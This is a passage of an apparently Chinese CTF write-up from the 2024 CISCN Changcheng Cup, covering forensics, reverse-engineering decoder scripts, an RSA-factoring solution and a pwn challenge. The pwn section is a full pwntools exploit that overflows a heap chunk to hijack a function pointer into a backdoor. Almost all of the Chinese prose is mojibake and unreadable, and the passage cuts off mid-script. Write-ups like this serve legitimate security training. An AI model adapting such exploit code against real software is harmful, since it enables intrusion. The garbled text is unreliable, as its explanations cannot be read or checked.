class=""><p>ä½¿ç”¨xxd -pä»¥16è¿›åˆ¶å½¢å¼å¯¼å‡º ç„¶åå­˜ä¸ºelfæ–‡ä»¶ç”¨idaæ‰“å¼€</p><p>shift+f12å®šä½å­—ç¬¦ä¸²ï¼ŒæŸ¥æ‰¾å‘ç°ä¸€ä¸ªæ¯”è¾ƒåƒkeyçš„11223344qweasdzxcï¼ŒåŒ…ä¸Šflagæäº¤æ­£ç¡®ã€‚</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235013126.png" class=""><h3 id="zeroshell-6"><a href="#zeroshell-6" class="headerlink" title="zeroshell_6"></a>zeroshell_6</h3><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235024086.png" class=""><p>ç”¨qemu-imgè½¬ä¸€ä¸‹ï¼Œç”¨DiskGeniuxæŒ‚ä¸Šï¼Œå†æŠŠæ–‡ä»¶å¯¼å‡ºæ¥</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235031113.png" class=""><p>ç”¨Sublime.txtæœä¸€ä¸‹</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235039272.png" class=""><p>flag{&#x2F;var&#x2F;register&#x2F;system&#x2F;startup&#x2F;scripts&#x2F;nat&#x2F;File}</p><h3 id="Win-FT1"><a href="#Win-FT1" class="headerlink" title="Win_FT1"></a>Win_FT1</h3><p>æ‰“å¼€ä¹‹åç”¨è™šæ‹Ÿæœºè‡ªå¸¦çš„</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235053509.png" class=""><p>flag{<a href="http://miscsecure.com/">miscsecure.com</a>:192.168.116.130:443}</p><h3 id="Win-FT2"><a href="#Win-FT2" class="headerlink" title="Win_FT2"></a>Win_FT2</h3><p>ä¹Ÿæ˜¯è‡ªå¸¦PCHunterï¼Œåœ¨å¯åŠ¨é¡¹é‚£é‡Œçœ‹è®¡åˆ’ä»»åŠ¡</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235108297.png" class=""><p>æœ€ä¸‹é¢æœ‰flagï¼Œåœ¨baseè§£ç å‡ºæ¥</p><h3 id="WinFT-5"><a href="#WinFT-5" class="headerlink" title="WinFT_5"></a>WinFT_5</h3><p>ç”¨ctf-netaèƒ½è·‘å‡ºæ¥ä¸¤ä¸ªzipï¼Œä½†æ˜¯æ ¼å¼ä¸å¯¹ï¼Œå»wiresharkæµé‡çœ‹å¯¼å‡ºhttpå¯¹è±¡ï¼Œå…¨éƒ¨å¯¼å‡ºæ¥ï¼Œä¸€ä¸ªæ˜¯ä¸å®Œæ•´çš„PKå¤´ï¼Œå¦ä¸€ä¸ªä¹Ÿæœ‰PKï¼Œæ‹¼æ¥æ‰“å¼€ï¼Œæ³¨é‡Šè§£ç å°±æ˜¯å¯†ç </p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235125784.png" class=""><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235159219.png" class=""><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235204456.png" class=""><h3 id="sc05-1"><a href="#sc05-1" class="headerlink" title="sc05_1"></a>sc05_1</h3><p>çœ‹tcp</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235216129.png" class=""><p>è¿™ä¸ªå°±æ˜¯ï¼Œç©ºæ ¼è½¬_å†è½¬md5å†å¤§å†™</p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="ezCsky"><a href="#ezCsky" class="headerlink" title="ezCsky"></a>ezCsky</h3><p>æ ¹æ®æç¤ºmipsï¼Œidamipsæ¶æ„æ‰“å¼€</p><p>å‘ç°æ ‡å‡†çš„rc4åŠ å¯†å’Œå¼‚æˆ–æ“ä½œï¼Œå†™è„šæœ¬é€†å‡ºæ¥å°±æ˜¯flagã€‚</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235230180.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">_<span class="comment"># å®šä¹‰å¯†é’¥å’Œå¯†æ–‡ï¼ˆå¯†æ–‡ä»¥åå…­è¿›åˆ¶å½¢å¼è¡¨ç¤ºï¼‰_ key = b&quot;testkey&quot; ciphertext_hex = [ 0x96, 0x8F, 0xB8, 0x08, 0x5D, 0xA7, 0x68, 0x44, 0xF2, 0x64, 0x92, 0x64, 0x42, 0x7A, 0x78, 0xE6, 0xEA, 0xC2, 0x78, 0xB8, 0x63, 0x9E, 0x5B, 0x3D, 0xD9, 0x28, 0x3F, 0xC8, 0x73, 0x06, 0xEE, 0x6B, 0x8D, 0x0C, 0x4B, 0xA3, 0x23, 0xAE, 0xCA, 0x40, 0xED, 0xD1 ] _# ä½¿ç”¨ç»™å®šå¯†é’¥åˆå§‹åŒ–RC4è§£å¯†å™¨_ cipher = ARC4.new(key) _# è§£å¯†å¯†æ–‡_ plaintext = cipher.decrypt(bytes(ciphertext_hex)) plaintext=bytearray(plaintext) for i in range(len(plaintext)-1,0,-1): plaintext[i-1]^=plaintext[i] _# æ‰“å°è§£å¯†åçš„æ˜æ–‡_ print(plaintext)</span></span><br><span class="line"></span><br><span class="line">![](https://uik4u42yzi.feishu.cn/space/api/box/stream/download/asynccode/?code=NDY3ZGI2MDZhOWJiYzQxNTdiNTQxZmVmMDY2ZDkxYzVfV1NHbU5jT2pqRWhudGNBMmZIVTRzQjBsdkVuaWRBOW9fVG9rZW46UjFjUmJRQWdEbzVlWm14eVcwNGN3NGtFblJmXzE3MzU1NzM5NTY6MTczNTU3NzU1Nl9WNA)</span><br></pre></td></tr></table></figure><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235300026.png" class=""><h3 id="Dump"><a href="#Dump" class="headerlink" title="Dump"></a>Dump</h3><p>çº¸è€è™ï¼Œæ‰“å¼€å‘ç°åŠ å¯†é€»è¾‘ç‰¹åˆ«å¤æ‚ï¼Œä½†æ˜¯åŠ¨è°ƒæ—¶å€™å‘ç°æ˜¯å•ä¸ªå­—ç¬¦æ›¿æ¢ï¼Œæ‰€ä»¥ç›´æ¥è¯•å‡ºæ¥æ‰€æœ‰çš„mapç»„åˆä¹‹åè¯»å–flagæ–‡ä»¶è¿›è¡Œæ›¿æ¢å³å¯ã€‚</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235325754.png" class=""><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235330123.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">mapp = &#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0x1c</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">0x1d</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">0x01</span>: <span class="string">&#x27;=&#x27;</span>, <span class="number">0x02</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">0x03</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">0x04</span>: <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x05</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">0x06</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">0x07</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">0x08</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">0x09</span>: <span class="string">&#x27;H&#x27;</span>, <span class="number">0x0a</span>: <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x0b</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">0x0c</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">0x0d</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">0x0e</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">0x0f</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">0x10</span>: <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x11</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">0x12</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">0x13</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">0x14</span>: <span class="string">&#x27;S&#x27;</span>, <span class="number">0x15</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">0x16</span>: <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x17</span>: <span class="string">&#x27;V&#x27;</span>, <span class="number">0x18</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">0x19</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">0x1a</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="number">0x1b</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">0x1e</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x1f</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">0x20</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">0x21</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">0x22</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">0x23</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">0x24</span>: <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x25</span>: <span class="string">&#x27;h&#x27;</span>, <span class="number">0x26</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">0x27</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">0x28</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">0x29</span>: <span class="string">&#x27;l&#x27;</span>, <span class="number">0x2a</span>: <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x2b</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">0x2c</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">0x2d</span>: <span class="string">&#x27;p&#x27;</span>, <span class="number">0x2e</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">0x2f</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">0x30</span>: <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x31</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">0x32</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">0x33</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">0x34</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">0x35</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">0x36</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x37</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">0x38</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="number">0x39</span>: <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line"></span><br><span class="line">data = fp.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> byte == <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">flag += <span class="string">&quot;4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">flag += mapp.get(byte, <span class="string">&#x27;?&#x27;</span>) <span class="comment"># è‹¥æ²¡æœ‰å¯¹åº”å­—ç¬¦ï¼Œè¾“å‡ºâ€˜?â€™</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;MTczMDc4MzQ2Ng==&#125;</span></span><br></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="anote"><a href="#anote" class="headerlink" title="anote"></a>anote</h3><p>pwnç­¾åˆ°é¢˜ï¼Œå­˜åœ¨åé—¨å‡½æ•°ï¼Œedité‡Œå­˜åœ¨æº¢å‡ºå†™æ¼æ´ï¼Œä¸”editå®Œä¼šè°ƒç”¨fdä¸Šçš„æŒ‡é’ˆå‡½æ•°(æœ¬æ¥å­˜çš„æ˜¯putså‡½æ•°)ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æº¢å‡ºä¿®æ”¹æ‰è¯¥æŒ‡é’ˆå‡½æ•°ï¼Œä¸è¿‡æ³¨æ„è¿™é‡Œæ˜¯é—´æ¥è°ƒç”¨ã€‚æ‰€ä»¥ä¿®æ”¹1çš„fdæŒ‡å‘chunk0_dataï¼Œä¿®æ”¹chunk0_dataä¸ºåé—¨å‡½æ•°å³å¯ã€‚</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235355720.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line"></span><br><span class="line">p.send(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>):</span><br><span class="line"></span><br><span class="line">p.sendafter(a, b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line"></span><br><span class="line">p.sendline(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(a, b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p.recv(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">a</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>(<span class="params">libc_base</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;39.105.123.22&#x27;,26759)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,data</span>):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;len: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;content: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;gift: 0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">7</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x80489CE</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x1c</span>,p32(backdoor) * <span class="number">4</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x21</span>) + p32(heap_base + <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å¯†ç "><a href="#å¯†ç " class="headerlink" title="å¯†ç "></a>å¯†ç </h2><h3 id="rasnd"><a href="#rasnd" class="headerlink" title="rasnd"></a>rasnd</h3><p>ä¸¤ç«¯flagã€‚</p><p>ç¬¬ä¸€æ®µflagï¼Œx1å’Œx2èŒƒå›´å¾ˆå°ï¼Œå¯ä»¥ç›´æ¥çˆ†ç ´ï¼Œé€šè¿‡çˆ†ç ´x1å’Œx2ï¼Œç”¨iå’Œjæ›¿ä»£ï¼Œå¯ä»¥å¾—å‡ºq_ &#x3D; (hint1 + 0x114) * i - (hint2 + 0x514) * jï¼Œå…¶ä¸­q_ &#x3D; k * qï¼Œå’Œnå–gcdå³å¯æ±‚å¾—qï¼Œä¹‹åå¸¸è§„rsaã€‚</p><p>ç¬¬äºŒæ®µflagï¼Œ</p><p>ç”±è´¹é©¬å°å®šç†æ¨å¯¼å¯å¾—ï¼Œ</p><p>(514Ã—<em>p_âˆ’114Ã—_q</em>)<em>n_âˆ’1â‰¡1mod_n</em></p><p>(514Ã—<em>p_âˆ’114Ã—_q</em>)<em>n_âˆ’_p_âˆ’_q_â‰¡(514Ã—_p_âˆ’114Ã—_q</em>)âˆ’1mod_n_</p><p>514Ã—<em>p_âˆ’114Ã—_q</em>&#x3D;inverse(hint,<em>n</em>)</p><p>æ‰€ä»¥ï¼Œè”åˆ514Ã—<em>p_âˆ’114Ã—_q</em>&#x3D;inverse(hint,<em>n</em>)å’Œp * q &#x3D; nç”¨sympyæ±‚è§£æ–¹ç¨‹å³å¯ã€‚</p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">23648865866967474741270370397132423067699850427877137954637744104915275862580729305752649659558903208704210520404455263487922574349344027608455219594970370136631537542988690942079596027410950309104210502316881241869253489791957580833197505343865871369332227319727036871601879356647931354999801556527525622386714474862274478072900776772849916088407385085172793529891976940198603667276046943913747882879444205337013047716443965133641695789732469801138839086918597765389860490103516114749193605536932674219305575208345984041924802827995594848795451094637394349237489219593447305188127031731811579960869233342752536100527</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">12871293048733428405921993001474578995576966407212209002496627586541981587684719987156443294124310716965280212719390338695202157815376863019064093567216994679080289411869769698877420309738539393058199884618426735251695293632309349130302017107525370437009808089940546467740239387244603064354072024228584137505815198672524214329434003062957282331772544865942114036138240427590282222587632491953027413817537467476211495107817229494683254318465555361112148153968926339393351690557655234472182328031652147228622097814985937486244681684439084740792730260943438322469368997572013403493837626811395296875828720042085253741244</span></span><br><span class="line"></span><br><span class="line">hint1 = <span class="number">2703642595294748564643622671649399553349260234587100086533241345261637498325534113322955496677225272148642070369301838312297245973046433308957535756264825008875364114414462464128235947776518582564921697809360918803644869806695489185714944767429577379660277801285524808124565008668088032699224448150409658247394175183890031779925039061797406792</span></span><br><span class="line"></span><br><span class="line">hint2 = <span class="number">2169410035515532906876819913960514081818308685030029528953082846373483240480780518798810730623580967118171766601339077609903728723280859124374334171316025172163690787871809134051967615896421514542191920476370854639765281638331517908871407380213580237559660767770824604364909376856664112138905994069463543058446850133401352199000299080386495040556940824325347535607774724849323181852372710392377956213046858908265330857740740847558701275465534872986005202129327090</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>():</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span> ** <span class="number">11</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span> ** <span class="number">11</span>):</span><br><span class="line"></span><br><span class="line">q_ = (hint1 + <span class="number">0x114</span>) * i - (hint2 + <span class="number">0x514</span>) * j</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> gmpy2.gcd(q_, n) != <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">q = gmpy2.gcd(q_, n)</span><br><span class="line"></span><br><span class="line">p = n // q</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (phi))</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> flag1</span><br><span class="line"></span><br><span class="line">flag1 = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">fun1()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"></span><br><span class="line">n2 = <span 